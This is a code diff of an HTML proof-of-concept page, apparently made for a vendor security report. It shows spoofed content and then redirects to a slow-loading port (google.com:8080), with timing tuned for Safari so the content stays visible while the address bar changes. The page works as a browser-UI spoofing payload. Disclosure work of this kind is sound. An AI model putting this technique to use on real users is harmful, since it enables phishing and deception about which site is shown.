@@ -2,65 +2,69 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>MSRC / Apple Security PoC</title>
+<title>Apple Security PoC (ms)</title>
 <style>
   body {
-    font-family: system-ui, -apple-system, BlinkMacSystemFont;
+    font-family: -apple-system, BlinkMacSystemFont, system-ui;
     text-align: center;
     margin-top: 60px;
   }
   #spoof {
     display: none;
   }
-  #timer {
+  #info {
     margin-top: 15px;
     font-size: 14px;
-    color: #555;
+    color: #444;
   }
 </style>
 </head>
 
 <body>
 
-<h1>MSRC / Apple Security PoC</h1>
-<button id="trigger">Trigger Navigation</button>
+<h1>Apple Security PoC</h1>
+<button id="trigger">Trigger</button>
 
 <div id="spoof">
   <h2>𝐷ℎ𝑎𝑓𝑦</h2>
-  <a href="https://example.com" target="_blank" rel="noopener">
-    <img src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
-         width="260">
-  </a>
-  <div id="timer">Visible: 0.0s</div>
+  <img src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
+       width="260">
+  <div id="info">Waiting…</div>
 </div>
 
 <script>
-let elapsed = 0;
-let interval;
+let startTime;
+let rafId;
 
 document.getElementById('trigger').addEventListener('click', () => {
 
-  // tampilkan konten spoof (user gesture)
-  document.getElementById('spoof').style.display = 'block';
+  const spoof = document.getElementById('spoof');
+  const info  = document.getElementById('info');
 
-  // timer visual untuk reviewer
-  interval = setInterval(() => {
-    elapsed += 0.1;
-    document.getElementById('timer').innerText =
-      "Visible: " + elapsed.toFixed(1) + "s";
-  }, 100);
+  spoof.style.display = 'block';
 
-  // pastikan repaint terjadi (Safari)
+  // precise start timestamp
+  startTime = performance.now();
+
+  // repaint‑aware timer (Safari‑friendly)
+  function update() {
+    const now = performance.now();
+    const diff = Math.round(now - startTime);
+    info.textContent = `Visible for ${diff} ms`;
+    rafId = requestAnimationFrame(update);
+  }
+
   requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-
-      // delay stabil > 1 detik (disarankan Apple)
-      setTimeout(() => {
-        clearInterval(interval);
-        location.href = "https://google.com:8080";
-      }, 3500); // 3.5 detik visible
-    });
+    requestAnimationFrame(update); // double RAF ensures paint
   });
+
+  // navigation after strong window (>1s)
+  setTimeout(() => {
+    cancelAnimationFrame(rafId);
+    const end = Math.round(performance.now() - startTime);
+    info.textContent = `Redirecting after ${end} ms`;
+    location.href = "https://google.com:8080";
+  }, 3200); // 3.2 seconds (SAFE margin)
 });
 </script>
 
